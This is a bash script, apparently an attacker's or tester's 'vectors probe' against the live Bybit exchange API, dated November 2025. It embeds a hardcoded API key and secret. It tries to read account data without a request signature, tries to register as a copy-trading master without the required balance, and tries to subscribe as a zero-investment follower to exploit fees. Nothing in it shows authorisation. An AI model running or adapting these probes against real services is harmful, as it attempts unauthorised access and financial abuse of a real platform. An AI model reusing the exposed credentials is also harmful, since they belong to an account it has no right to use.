#!/bin/bash
# FRESH VECTORS PROBE (Nov 24 2025)
# Based on new intel: Copy Trading & Key Leaks

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"

# Sync Time
OFFSET=$(($(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4) - $(date +%s)))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}5000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

echo "=========================================="
echo "VECTOR 5: API Key Metadata Leak (No Sign)"
echo "=========================================="

# Trying GET /v5/account/info without signature
# Expected: 10003/10004 Error
# Vulnerable: 0 OK or partial info
echo "requesting /v5/account/info?accountType=UNIFIED (No Sign)..."
curl -s -v "$BASE/v5/account/info?accountType=UNIFIED" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "Content-Type: application/json" 2>&1 | grep -E "< HTTP|retCode|result"

echo ""
echo "=========================================="
echo "VECTOR 4: Copy Trading Ghost Fees"
echo "=========================================="

# 1. Try to Register as Master (usually requires balance, checking bypass)
echo "[1] Attempting Master Registration..."
PAYLOAD='{"leaderName":"GhostMaster","symbol":"BTCUSDT"}'
IFS='|' read -r ts sig <<< $(sign "$PAYLOAD")

curl -s "$BASE/v5/copy-trading/master/create" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD"

# 2. Try to Subscribe as Follower (Zero Balance)
echo ""
echo "[2] Attempting Follower Subscription (Ghost)..."
# Need a leader UID (using a random one or Top Leader if known)
LEADER_UID="12345678" 
PAYLOAD="{\"leaderMemberId\":\"$LEADER_UID\",\"investmentCoin\":\"USDT\",\"investmentAmount\":\"0\"}"
IFS='|' read -r ts sig <<< $(sign "$PAYLOAD")

curl -s "$BASE/v5/copy-trading/follower/subscribe" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD"

echo ""
echo "=========================================="
